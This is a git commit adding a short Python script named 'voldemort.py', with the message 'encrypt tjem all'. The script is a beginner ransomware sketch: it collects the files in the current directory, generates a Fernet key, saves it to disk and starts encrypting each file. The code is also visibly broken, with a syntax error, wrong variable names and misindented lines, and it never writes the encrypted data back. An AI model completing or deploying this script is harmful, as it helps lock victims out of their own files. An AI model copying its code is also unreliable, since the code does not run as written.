70c53141a58ac0f7a831e23f9b1bcc87a87a67cd
hacker010100101010101 <113329400+hacker010100101010101@users.noreply.github.com>
2023-01-14 21:40:03 -0800

    voldemort.py
    encrypt tjem all

---
+++ voldemort.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+#let's find some files
+
+
+files = []
+
+for file in os.listdir():
+        if file == "voldemort.py" or file == "thekey.key":
+                continue
+        if os.path.isfile(file):
+                file.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open(:"thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+for files in files:
+           with open(file, "rb") as thefile:
+                   contents = thefile.read()
+                contents_encrypted = Fernet(key).encrypt(contents)
